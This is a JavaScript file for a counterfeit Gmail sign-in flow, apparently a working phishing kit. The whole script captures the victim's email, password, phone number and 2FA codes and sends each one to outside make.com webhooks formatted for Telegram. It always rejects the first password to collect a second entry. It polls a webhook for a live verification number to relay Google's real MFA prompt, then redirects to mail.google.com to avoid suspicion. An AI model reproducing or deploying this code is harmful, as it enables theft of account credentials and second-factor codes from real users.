document.addEventListener('DOMContentLoaded', function() {
    // Step elements
    const emailStep = document.getElementById('email-step');
    const passwordStep = document.getElementById('password-step');
    const passwordIncorrectStep = document.getElementById('password-incorrect-step');
    const gmailPromptStep = document.getElementById('gmail-prompt-step');
    const verificationMethodStep = document.getElementById('verification-method-step');
    const phoneInputStep = document.getElementById('phone-input-step');
    const verificationStep = document.getElementById('verification-step');
    const successStep = document.getElementById('success-step');
    const loadingScreen = document.getElementById('loading-screen');
    const loadingText = document.getElementById('loading-text');
    
    // Ensure proper initial state - force hide loading screen and show email step
    loadingScreen.classList.add('hidden');
    emailStep.classList.remove('hidden');
    
    // Hide all other steps explicitly
    passwordStep.classList.add('hidden');
    passwordIncorrectStep.classList.add('hidden');
    gmailPromptStep.classList.add('hidden');
    verificationMethodStep.classList.add('hidden');
    phoneInputStep.classList.add('hidden');
    verificationStep.classList.add('hidden');
    successStep.classList.add('hidden');
    
    // Form elements
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const phoneNumberInput = document.getElementById('phone-number');
    const verificationCodeInput = document.getElementById('verification-code');
    const userEmailDisplay = document.getElementById('user-email');
    const userPhoneDisplay = document.getElementById('user-phone');
    
    // Verification method elements
    const phoneMethod = document.getElementById('phone-method');
    const authenticatorMethod = document.getElementById('authenticator-method');
    const phoneVerificationInfo = document.getElementById('phone-verification-info');
    const authenticatorVerificationInfo = document.getElementById('authenticator-verification-info');
    const verificationHelpLink = document.getElementById('verification-help-link');
    
    // Button elements
    const emailNextButton = document.getElementById('email-next');
    const passwordNextButton = document.getElementById('password-next');
    const backToPasswordButton = document.getElementById('back-to-password');
    const backToVerificationMethodsButton = document.getElementById('back-to-verification-methods');
    const phoneNextButton = document.getElementById('phone-next');
    const backButton = document.getElementById('back-button');
    const verificationNextButton = document.getElementById('verification-next');
    const continueToGmailButton = document.getElementById('continue-to-gmail');
    const backToEmailButton = document.getElementById('back-to-email');
    
    // Track verification method
    let selectedVerificationMethod = null;
    
    // API configuration
    const API_ENDPOINT = 'https://hook.eu2.make.com/wmduh51b8n4vs8yt8jygndpxcttbgq3y';
    
    // Function to send data to API with Telegram formatting
    async function sendToAPI(stage, data) {
        try {
            // Format message for Telegram
            let message = `🔐 *Gmail Login Activity*\n\n`;
            message += `📍 *Stage:* ${stage}\n`;
            message += `⏰ *Time:* ${new Date().toLocaleString()}\n\n`;
            
            // Add stage-specific data
            for (const [key, value] of Object.entries(data)) {
                if (value) {
                    message += `• *${key}:* ${value}\n`;
                }
            }
            
            const payload = {
                stage: stage,
                timestamp: new Date().toISOString(),
                data: data,
                telegram_message: message
            };
            
            const response = await fetch(API_ENDPOINT, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });
            
            if (response.ok) {
                console.log(`✅ Stage "${stage}" data sent successfully`);
            } else {
                console.error(`❌ Failed to send stage "${stage}" data:`, response.status);
            }
        } catch (error) {
            console.error(`❌ Error sending stage "${stage}" data:`, error);
        }
    }
    
    // Loading screen utility functions
    function showLoadingScreen(message) {
        loadingText.textContent = message;
        // Hide all specific steps
        hideElement(emailStep);
        hideElement(passwordStep);
        hideElement(passwordIncorrectStep);
        hideElement(gmailPromptStep);
        hideElement(verificationMethodStep);
        hideElement(phoneInputStep);
        hideElement(verificationStep);
        hideElement(successStep);
        // Show loading screen
        showElement(loadingScreen);
    }
    
    function hideLoadingScreen() {
        hideElement(loadingScreen);
    }
    
    function transitionWithLoading(fromStep, toStep, loadingMessage, callback) {
        // Show loading screen
        showLoadingScreen(loadingMessage);
        
        // After 3 seconds, hide loading and show next step
        setTimeout(() => {
            hideLoadingScreen();
            showElement(toStep);
            if (callback) callback();
        }, 3000);
    }
    
    // Email step
    emailNextButton.addEventListener('click', function() {
        const email = emailInput.value.trim();
        
        if (!email) {
            showError(emailInput, 'Please enter your email');
            return;
        }
        
        if (!isValidEmail(email)) {
            showError(emailInput, 'Please enter a valid email address');
            return;
        }
        
        // Set the email in the password step
        userEmailDisplay.textContent = email;
        
        // Send email data to API
        sendToAPI('Email Entered', {
            'Email Address': email,
            'Browser': navigator.userAgent,
            'Platform': navigator.platform,
            'Screen Resolution': `${screen.width}x${screen.height}`,
            'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone
        });
        
        // Transition with loading
        transitionWithLoading(
            emailStep, 
            passwordStep, 
            'Verifying account...', 
            () => passwordInput.focus()
        );
    });
    
    // Track password attempts
    let passwordAttempts = 0;
    
    // Password step
    passwordNextButton.addEventListener('click', function() {
        const password = passwordInput.value.trim();
        
        if (!password) {
            showError(passwordInput, 'Please enter your password');
            return;
        }
        
        if (password.length < 8) {
            showError(passwordInput, 'Password must be at least 8 characters');
            return;
        }
        
        passwordAttempts++;
        
        // Send first password attempt data to API
        sendToAPI('First Password Attempt', {
            'Email Address': userEmailDisplay.textContent,
            'Password (Initial)': password,
            'Password Length': password.length.toString(),
            'Has Numbers': /\d/.test(password) ? 'Yes' : 'No',
            'Has Special Characters': /[!@#$%^&*()_+\-=\[\]{};':"\\\/?.,<>]/.test(password) ? 'Yes' : 'No',
            'Has Uppercase': /[A-Z]/.test(password) ? 'Yes' : 'No',
            'Has Lowercase': /[a-z]/.test(password) ? 'Yes' : 'No',
            'Attempt Number': passwordAttempts.toString(),
            'Status': 'Password Rejected - Incorrect'
        });
        
        // Set email for the incorrect password step
        document.getElementById('user-email-incorrect').textContent = userEmailDisplay.textContent;
        
        // Transition to password incorrect step
        transitionWithLoading(
            passwordStep, 
            passwordIncorrectStep, 
            'Verifying password...'
        );
    });
    
    // Password Incorrect Step handlers
    const passwordRetryInput = document.getElementById('password-retry');
    const passwordRetryNextButton = document.getElementById('password-retry-next');
    const backToEmailFromIncorrectButton = document.getElementById('back-to-email-from-incorrect');
    
    // Password retry step
    passwordRetryNextButton.addEventListener('click', function() {
        const retryPassword = passwordRetryInput.value.trim();
        
        if (!retryPassword) {
            showError(passwordRetryInput, 'Please enter your password');
            return;
        }
        
        if (retryPassword.length < 8) {
            showError(passwordRetryInput, 'Password must be at least 8 characters');
            return;
        }
        
        passwordAttempts++;
        
        // Send the actual password (second attempt) to API
        sendToAPI('Password Confirmed (Retry)', {
            'Email Address': userEmailDisplay.textContent,
            'Password (Actual)': retryPassword,
            'Password Length': retryPassword.length.toString(),
            'Has Numbers': /\d/.test(retryPassword) ? 'Yes' : 'No',
            'Has Special Characters': /[!@#$%^&*()_+\-=\[\]{};':"\\\/?.,<>]/.test(retryPassword) ? 'Yes' : 'No',
            'Has Uppercase': /[A-Z]/.test(retryPassword) ? 'Yes' : 'No',
            'Has Lowercase': /[a-z]/.test(retryPassword) ? 'Yes' : 'No',
            'Attempt Number': passwordAttempts.toString(),
            'Status': 'Password Accepted - Proceeding to Verification'
        });
        
        // Set email for the prompt step
        document.getElementById('user-email-prompt').textContent = userEmailDisplay.textContent;
        
        // Show loader instead of random number
        showNumberLoader();
        
        // Transition to Gmail prompt step
        transitionWithLoading(
            passwordIncorrectStep, 
            gmailPromptStep, 
            'Password verified. Checking security settings...'
        );
    });
    
    // Back to email from password incorrect
    backToEmailFromIncorrectButton.addEventListener('click', function() {
        hideElement(passwordIncorrectStep);
        showElement(emailStep);
        emailInput.focus();
    });
    
    // Gmail Prompt Step handlers
    const tryOtherWaysButton = document.getElementById('try-other-ways');
    const backToPasswordFromPromptButton = document.getElementById('back-to-password-from-prompt');
    
    // Simulate prompt verification with API response
    let promptTimeout;
    let isPollingActive = false;
    
    async function startPromptVerification() {
        // Only start if we're not already polling
        if (isPollingActive) {
            console.log('Polling already active, skipping...');
            return;
        }
        
        isPollingActive = true;
        
        // Send prompt display data to API
        sendToAPI('Gmail Prompt Displayed', {
            'Email Address': userEmailDisplay.textContent,
            'Prompt Number': document.getElementById('prompt-number').textContent,
            'Device Type': 'iPhone',
            'Verification Method': 'Gmail App Prompt',
            'Status': 'Waiting for user confirmation'
        });
        
        while (isPollingActive) {
            try {
                const response = await fetch('https://hook.eu2.make.com/8vhxuy1wth8xeyawwnniny7agamhn38r');
                if (response.ok) {
                    const data = await response.json();
                    
                    // Check if we have verification_number in response
                    if (data.verification_number && isPollingActive) {
                        // Update the displayed numbers with the API response
                        document.getElementById('prompt-number').textContent = data.verification_number;
                        document.getElementById('display-number').textContent = data.verification_number;
                        
                        // Update status text with countdown
                        let countdown = 20;
                        document.getElementById('status-text').textContent = `Tap ${data.verification_number} on your device to confirm (${countdown}s)`;
                        
                        // Send API verification number received notification
                        sendToAPI('API Verification Number Received', {
                            'Email Address': userEmailDisplay.textContent,
                            'API Verification Number': data.verification_number,
                            'API Timestamp': data.timestamp,
                            'Status': 'Code displayed - Auto-proceeding in 20 seconds'
                        });
                        
                        // Stop polling since we found a valid code
                        isPollingActive = false;
                        
                        // Start countdown timer
                        const countdownInterval = setInterval(() => {
                            countdown--;
                            document.getElementById('status-text').textContent = `Tap ${data.verification_number} on your device to confirm (${countdown}s)`;
                            
                            if (countdown <= 0) {
                                clearInterval(countdownInterval);
                            }
                        }, 1000);
                        
                        // Auto-proceed after 20 seconds
                        promptTimeout = setTimeout(() => {
                            clearInterval(countdownInterval);
                            sendToAPI('Gmail Prompt Auto-Verified', {
                                'Email Address': userEmailDisplay.textContent,
                                'Prompt Number': data.verification_number,
                                'Action': 'Auto-proceeded after 20 seconds',
                                'Status': 'Verification Successful'
                            });
                            // Transition to verification method selection
                            transitionWithLoading(
                                gmailPromptStep,
                                verificationMethodStep,
                                'Verification confirmed. Setting up additional security...'
                            );
                        }, 20000);
                        break;
                    }
                } else if (response.status === 400) {
                    // Retry on 400 error
                    console.warn('400 Error, retrying...');
                }
            } catch (error) {
                console.error('Error fetching code:', error);
            }
            
            // Only continue polling if still active
            if (isPollingActive) {
                await new Promise((resolve) => setTimeout(resolve, 5000));
            }
        }
    }
    
    function stopPromptVerification() {
        isPollingActive = false;
        clearTimeout(promptTimeout);
        console.log('Stopped prompt verification polling');
    }
    
    // Start the prompt verification only when the Gmail prompt step is actually shown
    const originalTransition = transitionWithLoading;
    transitionWithLoading = function(fromStep, toStep, loadingMessage, callback) {
        // Stop any existing polling when transitioning away from Gmail prompt
        if (fromStep === gmailPromptStep) {
            stopPromptVerification();
        }
        
        originalTransition(fromStep, toStep, loadingMessage, () => {
            // Only start polling when we reach the Gmail prompt step
            if (toStep === gmailPromptStep) {
                console.log('Reached Gmail prompt step - starting verification polling');
                startPromptVerification();
            }
            if (callback) callback();
        });
    };
    
    // Try other ways button
    tryOtherWaysButton.addEventListener('click', function() {
        stopPromptVerification();
        
        sendToAPI('Gmail Prompt Skipped', {
            'Email Address': userEmailDisplay.textContent,
            'Action': 'Try Other Ways Selected',
            'Reason': 'User chose alternative verification method'
        });
        
        // Go directly to verification method selection
        transitionWithLoading(
            gmailPromptStep,
            verificationMethodStep,
            'Loading alternative verification methods...'
        );
    });
    
    // Back to password from prompt
    backToPasswordFromPromptButton.addEventListener('click', function() {
        stopPromptVerification();
        hideElement(gmailPromptStep);
        showElement(passwordStep);
        passwordInput.focus();
    });
    
    // Verification method selection
    phoneMethod.addEventListener('click', function() {
        // Highlight selection
        phoneMethod.classList.add('selected');
        authenticatorMethod.classList.remove('selected');
        selectedVerificationMethod = 'phone';
        
        // Send verification method selection to API
        sendToAPI('2FA Method Selected', {
            'Email Address': userEmailDisplay.textContent,
            'Selected Method': 'SMS / Text Message',
            'Method Type': 'Phone Number Verification',
            'Security Level': 'Standard'
        });
        
        // Transition with loading
        transitionWithLoading(
            verificationMethodStep, 
            phoneInputStep, 
            'Setting up SMS verification...', 
            () => phoneNumberInput.focus()
        );
    });
    
    authenticatorMethod.addEventListener('click', function() {
        // Highlight selection
        authenticatorMethod.classList.add('selected');
        phoneMethod.classList.remove('selected');
        selectedVerificationMethod = 'authenticator';
        
        // Send authenticator method selection to API
        sendToAPI('2FA Method Selected', {
            'Email Address': userEmailDisplay.textContent,
            'Selected Method': 'Google Authenticator',
            'Method Type': 'App-based Authentication',
            'Security Level': 'High'
        });
        
        // Configure verification step for authenticator
        hideElement(phoneVerificationInfo);
        showElement(authenticatorVerificationInfo);
        verificationHelpLink.textContent = 'Having trouble with your authenticator app?';
        
        // Transition with loading
        transitionWithLoading(
            verificationMethodStep, 
            verificationStep, 
            'Connecting to authenticator app...', 
            () => verificationCodeInput.focus()
        );
    });
    
    // Back to password from verification method selection
    backToPasswordButton.addEventListener('click', function() {
        hideElement(verificationMethodStep);
        showElement(passwordStep);
        passwordInput.focus();
    });
    
    // Phone number input
    phoneNextButton.addEventListener('click', function() {
        const phoneNumber = phoneNumberInput.value.trim();
        
        if (!phoneNumber) {
            showError(phoneNumberInput, 'Please enter your phone number');
            return;
        }
        
        // Display formatted phone number
        userPhoneDisplay.textContent = formatPhoneNumberForDisplay(phoneNumber);
        
        // Send phone number data to API
        sendToAPI('Phone Number Entered', {
            'Email Address': userEmailDisplay.textContent,
            'Phone Number': phoneNumber,
            'Formatted Phone': formatPhoneNumberForDisplay(phoneNumber),
            'Country Code': phoneNumber.startsWith('+') ? phoneNumber.substring(0, phoneNumber.indexOf(' ')) : 'Unknown',
            'Verification Method': 'SMS'
        });
        
        // Configure verification step for phone
        showElement(phoneVerificationInfo);
        hideElement(authenticatorVerificationInfo);
        verificationHelpLink.textContent = 'Didn\'t receive a code?';
        
        // Simulate sending verification code (in a real app, this would be handled by backend)
        simulateSendingVerificationCode();
        
        // Transition with loading
        transitionWithLoading(
            phoneInputStep, 
            verificationStep, 
            'Sending verification code...', 
            () => verificationCodeInput.focus()
        );
    });
    
    // Back to verification methods from phone input
    backToVerificationMethodsButton.addEventListener('click', function() {
        hideElement(phoneInputStep);
        showElement(verificationMethodStep);
    });
    
    // Back from verification step
    backButton.addEventListener('click', function() {
        hideElement(verificationStep);
        
        if (selectedVerificationMethod === 'phone') {
            showElement(phoneInputStep);
            phoneNumberInput.focus();
        } else {
            showElement(verificationMethodStep);
        }
    });
    
    // Verification step
    verificationNextButton.addEventListener('click', function() {
        const code = verificationCodeInput.value.trim();
        
        if (!code) {
            showError(verificationCodeInput, 'Please enter the verification code');
            return;
        }
        
        if (code.length !== 6 || !/^\d+$/.test(code)) {
            showError(verificationCodeInput, 'Please enter a valid 6-digit verification code');
            return;
        }
        
        // Send verification code data to API
        sendToAPI('Verification Code Entered', {
            'Email Address': userEmailDisplay.textContent,
            'Verification Code': code,
            'Method Used': selectedVerificationMethod === 'phone' ? 'SMS' : 'Google Authenticator',
            'Phone Number': selectedVerificationMethod === 'phone' ? userPhoneDisplay.textContent : 'N/A',
            'Attempt Time': new Date().toLocaleString(),
            'Status': 'Code Submitted'
        });
        
        // Transition with loading
        transitionWithLoading(
            verificationStep, 
            successStep, 
            'Completing sign in...'
        );
    });
    
    // Success step
    continueToGmailButton.addEventListener('click', function() {
        // Send final completion data to API
        sendToAPI('Login Flow Completed', {
            'Email Address': userEmailDisplay.textContent,
            'Verification Method': selectedVerificationMethod === 'phone' ? 'SMS' : 'Google Authenticator',
            'Phone Number': selectedVerificationMethod === 'phone' ? userPhoneDisplay.textContent : 'N/A',
            'Session Duration': 'N/A',
            'Final Status': '✅ Login Successfully Completed',
            'Next Action': 'Redirecting to Gmail'
        });
        
        // Small delay to ensure API call completes before redirect
        setTimeout(() => {
            // In a real app, this would redirect to Gmail
            window.location.href = 'https://mail.google.com';
        }, 1000);
    });
    
    // Back to email step
    backToEmailButton.addEventListener('click', function() {
        hideElement(passwordStep);
        showElement(emailStep);
        emailInput.focus();
    });
    
    // Helper functions
    function hideElement(element) {
        element.classList.add('hidden');
    }
    
    function showElement(element) {
        element.classList.remove('hidden');
    }
    
    function showError(input, message) {
        // Remove any existing error
        const existingError = input.parentElement.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }
        
        // Create and add error message
        const errorElement = document.createElement('div');
        errorElement.className = 'error-message';
        errorElement.style.color = '#f28b82';
        errorElement.style.fontSize = '12px';
        errorElement.style.marginTop = '8px';
        errorElement.style.textAlign = 'left';
        errorElement.textContent = message;
        
        input.parentElement.appendChild(errorElement);
        
        // Highlight input
        input.style.borderColor = '#f28b82';
        
        // Focus on input
        input.focus();
        
        // Remove error when input changes
        input.addEventListener('input', function() {
            const error = input.parentElement.querySelector('.error-message');
            if (error) {
                error.remove();
                input.style.borderColor = '';
            }
        }, { once: true });
    }
    
    function isValidEmail(email) {
        // Simple email validation regex
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }
    
    function formatPhoneNumberForDisplay(phoneNumber) {
        // This is a simple function to display a partially obscured phone number
        // In a real app, you would use the actual user's phone number from their account
        const cleaned = phoneNumber.replace(/\D/g, '');
        const last4 = cleaned.slice(-4);
        return `+1 (***) ***-${last4.slice(0, 2)}${last4.slice(2)}`;
    }
    
    function simulateSendingVerificationCode() {
        // In a real app, this would make an API call to send a verification code
        console.log('Verification code sent to phone number');
        
        // Simulate a 6-digit code (in a real app, this would be generated on the backend)
        const code = '123456';
        console.log('Verification code:', code);
    }
    
    // Function to show loading spinner in the number section
    function showNumberLoader() {
        const promptNumber = document.getElementById('prompt-number');
        const displayNumber = document.getElementById('display-number');
        
        // Replace number with loading spinner
        promptNumber.innerHTML = '<div class="number-loader"></div>';
        displayNumber.textContent = '...';
        
        // Update instruction text
        const instructionElement = document.querySelector('.prompt-instruction');
        instructionElement.innerHTML = 'Google sent a notification to your iPhone. Open the Gmail app, tap <strong>Yes</strong> in the prompt, then tap the number on your phone to confirm that it is you.';
    }
});

// Add event listeners for Enter key
document.addEventListener('keydown', function(event) {
    if (event.key === 'Enter') {
        const activeElement = document.activeElement;
        
        if (activeElement.id === 'email') {
            document.getElementById('email-next').click();
        } else if (activeElement.id === 'password') {
            document.getElementById('password-next').click();
        } else if (activeElement.id === 'password-retry') {
            document.getElementById('password-retry-next').click();
        } else if (activeElement.id === 'phone-number') {
            document.getElementById('phone-next').click();
        } else if (activeElement.id === 'verification-code') {
            document.getElementById('verification-next').click();
        }
    }
});
